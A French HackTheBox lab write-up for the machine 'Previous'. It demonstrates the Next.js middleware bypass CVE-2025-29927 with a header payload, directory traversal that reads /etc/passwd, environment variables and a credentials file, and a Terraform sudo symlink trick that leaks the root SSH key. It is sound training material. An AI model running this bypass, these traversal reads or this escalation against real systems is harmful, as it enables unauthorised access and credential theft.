<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Previous</title>
<meta name=description content="Platforme: HackTheBox Lien: Previous Niveau: Moyen OS: Linux L’exploitation de Previous débute par l’abus du CVE-2025-29927, une vulnérabilité de contournement …"><meta name=keywords content="HackTheBox,Next.js,CVE-2025-29927,Terraform"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-previous/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Previous"><meta property="og:description" content="Platforme: HackTheBox Lien: Previous Niveau: Moyen OS: Linux L’exploitation de Previous débute par l’abus du CVE-2025-29927, une vulnérabilité de contournement …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Previous/Previous.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Previous/Previous.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Previous"><meta name=twitter:description content="Platforme: HackTheBox Lien: Previous Niveau: Moyen OS: Linux L’exploitation de Previous débute par l’abus du CVE-2025-29927, une vulnérabilité de contournement …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-previous/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-previous/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Previous/Previous.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-previous/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-previous/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Previous</h1><small role=doc-subtitle></small><p class=post-date>8 min read |
<span class=post-date>11 Février 2026</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li><li class=post-tag><a href=https://scorpiosec.com/fr/tags/next.js>Next.js</a></li><li class=post-tag><a href=https://scorpiosec.com/fr/tags/cve-2025-29927>CVE-2025-29927</a></li><li class=post-tag><a href=https://scorpiosec.com/fr/tags/terraform>Terraform</a></li></ul></div><div class=post-content><ul><li>Platforme: HackTheBox</li><li>Lien: <a href=https://app.hackthebox.com/machines/Previous>Previous</a></li><li>Niveau: Moyen</li><li>OS: Linux</li></ul><hr><p>L’exploitation de Previous débute par l’abus du <code>CVE-2025-29927</code>, une vulnérabilité de contournement de l’authentification via le middleware de Next.js, permettant d’accéder à une fonctionnalité restreinte. Cet accès est ensuite mis à profit pour exploiter une vulnérabilité de traversée de répertoires, autorisant la lecture arbitraire de fichiers et la divulgation de données sensibles de l’application, notamment des identifiants SSH. Après l’obtention d’un premier accès au système, l&rsquo;élévation de privilèges est réalisée en abusant d’une exécution Terraform mal configurée avec les droits root, conduisant finalement à la récupération de la clé SSH de l’utilisateur root.</p><h1 id=balayage>Balayage</h1><pre tabindex=0><code>nmap -sC -sV -Pn -oA nmap/Previous {IP}
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2026-01-17 04:46 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.129.242.162 <span style=color:#56b6c2>(</span>10.129.242.162<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.16s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://previous.htb/
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 27.48 seconds
</span></span></code></pre></div><p>Nmap trouve deux ports ouverts exécutant <code>SSH</code> (22) et <code>http</code> (80), il y a également une redirection vers <code>previous.htb</code> que nous ajoutons au fichier <code>/etc/hosts</code>.</p><pre tabindex=0><code>sudo echo &#34;{IP} previous.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h1 id=enumération>Enumération</h1><p>Nous accédons au site web à l&rsquo;adresse <code>http://previous.htb/</code>. Il utilise un framework Javascript appelé <code>PreviousJS</code>.</p><p><img src=/images/HTB-Previous/Previous_website.png alt="Previous website"></p><p>Lorsque nous cliquons sur <code>Get Started</code> ou <code>Docs</code>, nous accédons à une page de connexion pour laquelle nous ne disposons d&rsquo;aucun identifiant.</p><p><img src=/images/HTB-Previous/login.png alt="Previous login page"></p><p>Grâce à Wappalyzer, nous constatons que l&rsquo;application utilise la version <code>15.2.2</code> de NextJS.</p><p><img src=/images/HTB-Previous/nextjs.png alt="Wappalyzer Previous"></p><p>Après avoir examiné les requêtes avec Burp, nous constatons que beaucoup passent par le répertoire <code>_next</code>. Une recherche rapide sur Google nous apprend qu&rsquo;il s&rsquo;agit d&rsquo;un dossier interne utilisé pour charger le Javascript et les données de page de l&rsquo;application.</p><p><img src=/images/HTB-Previous/next_reqs.png alt="Previous burp requests"></p><p>La capture d&rsquo;une requête de connexion révèle que l&rsquo;application utilise <code>NextAuth</code>, une bibliothèque d&rsquo;authentification. Elle fournit une protection contre les attaques CSRF (Cross-Site Request Forgery) sur toutes les routes d&rsquo;authentification.</p><blockquote><p>L&rsquo;application utilise <a href=https://next-auth.js.org/>NextAuth.js</a>, un package d&rsquo;authentification open source pour <code>Next.js</code>.</p></blockquote><p><img src=/images/HTB-Previous/NextAuth.png alt="Previous NextAuth"></p><p>L’énumération des répertoires par force brute ne permet de découvrir aucun nouvel élément pertinent.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://previous.htb
</code></pre><p><img src=/images/HTB-Previous/gobuster_previous.png alt="Previous gobuster"></p><p>Lors de la recherche de vulnérabilités connues affectant cette version de Next.js, nous identifions le <a href=https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass>CVE-2025-29927</a>, une vulnérabilité permettant de contourner l’authentification via le middleware. Les applications Next.js protègent fréquemment certaines routes à l’aide de middleware, ce qui permet aux développeurs d’exécuter une logique de contrôle avant qu’une requête n’atteigne une page ou une route API. En interne, Next.js utilise l’en-tête <code>x-middleware-subrequest</code> afin de suivre l’exécution du middleware lors de sous-requêtes internes. Cet en-tête est exclusivement destiné à la communication interne du framework et ne doit pas être considéré comme fiable lorsqu’il est fourni par un client externe.</p><p>Sur les versions vulnérables :</p><ul><li>L&rsquo;application fait confiance à l&rsquo;en-tête même lorsqu&rsquo;il provient de l&rsquo;utilisateur.</li><li>Si l&rsquo;en-tête est présent, la logique du middleware peut être ignorée.</li><li>Il en résulte la possibilité d&rsquo;accéder à des pages protégées sans se connecter.</li></ul><p>Le processus normal est le suivant:</p><pre tabindex=0><code>Request --&gt; Middleware (auth check) --&gt; Protected page 
</code></pre><p>En utilisant l&rsquo;en-tête malveillant:</p><pre tabindex=0><code>Request + x-middleware-subrequest
1. Le middleware pense qu&#39;il a déjà été exécuté.
2. La vérification d&#39;authentification est ignorée.
3. La page protégée est servie.
</code></pre><p>Essayons d&rsquo;exploiter cette vulnérabilité dans la page de connexion. L&rsquo;article nous indique d&rsquo;utiliser la charge utile suivante.</p><pre tabindex=0><code>x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
</code></pre><blockquote><p>Lorsque la liste d&rsquo;en-têtes contient le nom du middleware, le framework considère qu&rsquo;il s&rsquo;agit d&rsquo;une sous-requête interne et n&rsquo;applique pas les contrôles d&rsquo;authentification.
Nous répétons <code>middleware</code> car les versions récentes de Next.js intègrent un compteur de récursion afin d’éviter les boucles infinies. En interne, le framework ne saute l’exécution du middleware que si le nombre d’occurrences du nom du middleware dans l’en-tête <code>x-middleware-subrequest</code> est supérieur ou égal à la profondeur maximale de récursion (5).</p></blockquote><p>Nous capturons la requête que nous obtenons après avoir cliqué sur <code>Docs</code> et y ajoutons le payload.</p><p><img src=/images/HTB-Previous/bypass_payload.png alt="Previous auth bypass"></p><p>Insérer manuellement le payload dans chaque requête est fastidieux, nous ajoutons donc une règle dans les paramètres proxy de Burp pour résoudre ce problème.</p><p>Nous allons dans <code>Proxy settings</code> &ndash;> <code>Proxy</code>&ndash;> sous <code>HTTP match and replace rules</code> &ndash;> cliquer sur <code>Add</code> &ndash;> Ajoutons l&rsquo;en-tête &ndash;> <code>OK</code>.</p><blockquote><p>Lorsque la section <code>Match</code> est laissée vide, Burp ajoute l&rsquo;en-tête personnalisé à toutes les requêtes.</p></blockquote><p><img src=/images/HTB-Previous/burp_custom_header.png alt="Burp custom header"></p><p>Comme le montre l&rsquo;image ci-dessous, Burp ajoute automatiquement notre en-tête personnalisé à toutes les requêtes.</p><p><img src=/images/HTB-Previous/customreq_header_previous.png alt="Previous auth bypass"></p><p>Désormais, nous contournons automatiquement la fonctionnalité de connexion en cliquant simplement sur l&rsquo;un des boutons disponibles sur <code>http://previous.htb/</code>.</p><p><img src=/images/HTB-Previous/previous_logged_in.png alt="Previous logged in"></p><p>La section <code>Examples</code> mène à une page proposant une fonctionnalité de téléchargement.</p><p><img src=/images/HTB-Previous/previous_examples.png alt="Previous examples section"></p><p>Un fichier nommé <code>hello-world.ts</code> est téléchargé.</p><p><img src=/images/HTB-Previous/previous_download.png alt="Previous download request"></p><p>Nous testons la traversée de répertoires et remarquons que nous pouvons lire le fichier <code>/etc/passwd</code>.</p><p><img src=/images/HTB-Previous/dir_trav_previous.png alt="Previous directory traversal"></p><h1 id=accès-initial>Accès Initial</h1><p>Nous voyons deux utilisateurs: <code>node</code> et <code>nextjs</code>. Ensuite, nous lisons le fichier <code>/proc/self/environ</code>.</p><blockquote><p><code>/proc/self/environ</code> contient les variables d&rsquo;environnement du processus d&rsquo;application web actuellement en cours d&rsquo;exécution. Il comprend souvent des informations confidentielles telles que des identifiants, des clés API, etc.</p></blockquote><p><img src=/images/HTB-Previous/proc_self_env.png alt="Previous LFI abuse"></p><p>À partir du contenu de la réponse, nous pouvons déduire plusieurs éléments:</p><ul><li>Le backend de l’application s’exécute avec Node.js 18.</li><li>L’application est située dans le répertoire <code>/app</code>.</li></ul><p>Plusieurs fichiers de configuration courants sont généralement présents à la racine d’un projet Next.js:</p><ul><li><code>package.json</code>, qui définit les dépendances ainsi que les scripts npm.</li><li><code>next.config.js</code>, qui contient des paramètres de configuration optionnels propres à Next.js.</li><li>Les fichiers <code>.env</code> (par exemple <code>.env.local</code>), qui peuvent être utilisés pour stocker des variables d’environnement et des secrets.</li></ul><p>Nous lisons ensuite <code>package.json</code> et constatons que <code>NextAuth</code> y est mentionné une nouvelle fois ; cette fois-ci, sa version est également indiquée.</p><pre tabindex=0><code>../../../app/package.json
</code></pre><p><img src=/images/HTB-Previous/previous_pckg_json.png alt="Previous package.json"></p><p>Nous essayons maintenant de lire le fichier de configuration <code>NextAuth.js</code>. Nous apprenons <a href=https://next-auth.js.org/configuration/initialization>ici</a> que son emplacement peut être <code>/pages/api/auth/[...nextauth].js</code> ou <code>/app/api/auth/[...nextauth]/route.js</code>.</p><pre tabindex=0><code>/pages/api/auth/[...nextauth].js
/app/api/auth/[...nextauth]/route.js
</code></pre><p>Après avoir essayé les deux options, nous obtenons une erreur <code>File not found</code> ce qui signifie que l&rsquo;emplacement du fichier que nous avons fourni n&rsquo;est pas correct. Cela diffère d&rsquo;un manque d&rsquo;autorisation de lecture.</p><p><img src=/images/HTB-Previous/nextauth_404.png alt="Previous nextauth 404"></p><p>À titre d&rsquo;exemple, essayons de lire <code>root/root.txt</code>. Nous savons que ce fichier existe, car il s&rsquo;agit d&rsquo;une machine HackTheBox. Nous obtenons une erreur <code>Read error</code>, ce qui signifie que le fichier existe, mais que nous n&rsquo;avons pas l&rsquo;autorisation de le lire.</p><p><img src=/images/HTB-Previous/read_err_previous.png alt="Previous read error"></p><p>Nous pourrions continuer à deviner l&rsquo;emplacement spécifique du fichier, mais cela prendrait beaucoup de temps. Au lieu de cela, nous pouvons créer un exemple de projet à partir du fichier <code>package.son</code> et observer sa structure.</p><p>Ci-dessous se trouve la structure de mon projet.</p><p><img src=/images/HTB-Previous/nextjs_sample.png alt="Previous sample app"></p><p>À l&rsquo;intérieur de <code>nextjsapp</code>, nous exécutons:</p><pre tabindex=0><code>npm install

npm run build
</code></pre><p>Après avoir listé le contenu de <code>nextjsapp</code>, nous pouvons voir un répertoire <code>.next</code>. Ce répertoire est généré automatiquement et est utilisé à la fois pour le développement et la production. Il contient tout ce qui est nécessaire pour exécuter l&rsquo;application. Il contient donc certainement des fichiers sensibles.</p><p><img src=/images/HTB-Previous/next_dir.png alt="next directory"></p><p>Après avoir obtenu une vue d&rsquo;ensemble claire de la structure du projet, il est désormais facile de comprendre pourquoi <code>/pages/api/auth/[...nextauth].js</code> ne fonctionnait pas. <code>/pages/api/auth/[...nextauth].js</code> se trouve sous <code>/app/.next/server</code>.</p><p><img src=/images/HTB-Previous/next_tree.png alt="next directory tree"></p><p>L&rsquo;emplacement correct est</p><pre tabindex=0><code>../../../app/.next/server/pages/api/auth/[...nextauth].js
</code></pre><blockquote><p>Nous savions déjà que le chemin d&rsquo;accès au fichier comprenait <code>/pages/api/auth/[...nextauth].js</code>, mais il n&rsquo;était pas complet, ce qui expliquait pourquoi nous obtenions le message <code>File not found</code>. Une fois que nous avons trouvé les répertoires précédant <code>/pages</code>, le chemin d&rsquo;accès complet était désormais clair.</p></blockquote><p><img src=/images/HTB-Previous/nextauth_creds.png alt="next auth"></p><p>La réponse à la requête comprend du code JavaScript minifié, que nous traitons avec un <a href=https://beautifier.io/>embellisseur</a> afin de le rendre plus lisible. Il contient des informations d&rsquo;identification.</p><p><img src=/images/HTB-Previous/jere_creds.png alt="jeremy credentials"></p><pre tabindex=0><code>jeremy:MyNameIsJeremyAndILovePancakes
</code></pre><p>Nous les utilisons et nous nous connectons via SSH.</p><h1 id=elévation-de-privilèges>Elévation de Privilèges</h1><p>En exécutant <code>sudo -l</code>, nous observons que <code>jeremy</code> peut exécuter <code>terraform apply</code> en tant que root dans <code>/opt/examples</code>. De plus, <code>!env_reset</code> indique que les variables d&rsquo;environnement ne seront pas réinitialisées automatiquement lors de l&rsquo;exécution de sudo.</p><blockquote><p><code>env_reset</code> est activé par défaut, de sorte que lorsqu&rsquo;une commande est exécutée avec <code>sudo</code>, la plupart des variables d&rsquo;environnement sont effacées ou nettoyées. Cela permet d&rsquo;éviter des manipulations telles que <code>LD_PRELOAD</code>, le détournement de <code>PATH</code>, la manipulation de plugins, etc.</p></blockquote><p><img src=/images/HTB-Previous/sudo_l.png alt=sudo-l_cmd></p><p>Dans <code>/opt/examples/main.tf</code>, la variable <code>source_path</code> est définie avec <code>default = "/root/examples/hello-world.ts"</code>. Cela signifie que si l&rsquo;utilisateur ne fournit pas de valeur pour cette variable, Terraform utilisera automatiquement la valeur par défaut. De plus, tout chemin d&rsquo;accès fourni doit inclure <code>/root/examples</code>.</p><p>Terraform est configuré pour utiliser un fournisseur personnalisé <code>previous.htb/terraform/examples</code>.</p><blockquote><p>Un fournisseur est un plugin qui aide Terraform à interagir avec certains systèmes externes.</p></blockquote><p><img src=/images/HTB-Previous/tf_provider.png alt="Terraform provider"></p><p>Nous pouvons remplacer la valeur <code>default</code> de <code>source_path</code> en définissant notre propre chemin d&rsquo;accès au fichier. Étant donné que les variables d&rsquo;environnement ne seront pas réinitialisées, toutes les modifications que nous apportons seront conservées.</p><p><img src=/images/HTB-Previous/examples_previous.png alt="sample versions"></p><p>Exécutons le script.</p><pre tabindex=0><code>sudo /usr/bin/terraform -chdir\=/opt/examples apply
</code></pre><p><img src=/images/HTB-Previous/tf_apply.png alt="Terraform script"></p><p>Essentiellement, <code>/root/examples/hello-world.ts</code> est copié vers <code>/home/jeremy/docker/previous/public/examples/hello-world.ts</code>.</p><p><a href=https://developer.hashicorp.com/terraform/cli/config/environment-variables>Sur ce site</a> nous montre différentes façons de définir des variables pour Terraform. Nous pouvons utiliser <code>TF_VAR_name</code> pour définir des variables. Nous avons désormais tout ce qu&rsquo;il faut pour exploiter la cible.</p><p>Même s&rsquo;il existe une restriction relative au chemin d&rsquo;accès au fichier, celle-ci est purement basée sur une chaîne de caractères. Le script vérifie uniquement si le chemin d&rsquo;accès au fichier fourni contient <code>/root/examples</code>. Il n&rsquo;empêche pas non plus l&rsquo;utilisation de liens symboliques.</p><ol><li>Créer une fausse arborescence de répertoires autorisés.</li></ol><pre tabindex=0><code>mkdir -p /tmp/root/examples
</code></pre><ol start=2><li>Créer un lien symbolique pointant vers la clé privée root.</li></ol><pre tabindex=0><code>ln -sf /root/.ssh/id_rsa /tmp/root/examples
</code></pre><ol start=3><li>Remplacer la valeur par défaut de la variable <code>source_path</code>. Terraform s&rsquo;exécute en tant que root et transmet notre fichier contrôlé au fournisseur.</li></ol><pre tabindex=0><code>TF_VAR_source_path=/tmp/root/examples/id_rsa sudo terraform -chdir\=/opt/examples apply
</code></pre><p>Entrer <code>yes</code> lorsque vous êtes invité à <code>Enter a value</code>.</p><p><img src=/images/HTB-Previous/tf_id_rsa.png alt="Terraform script run"></p><ol start=4><li>Le fournisseur copie le fichier référencé dans le répertoire <code>examples</code> accessible à <code>jeremy</code>, ce qui permet la divulgation de la clé SSH <code>root</code>.</li></ol><pre tabindex=0><code>cat /home/jeremy/docker/previous/public/examples/id_rsa
</code></pre><p><img src=/images/HTB-Previous/root_SSH_key.png alt="Root SSH key"></p><p>Nous nous connectons en tant qu&rsquo;administrateur et lisons le fichier <code>root.txt</code>.</p><pre tabindex=0><code>ssh -i id_rsa root@previous.htb
</code></pre><p><img src=/images/HTB-Previous/previous_root_flag.png alt="Previous root flag"></p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-escapetwo/>&#8592;
Précédent:
HTB: EscapeTwo</a></p><p class=prev-post-date>mai 25, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès Initial</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2026 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>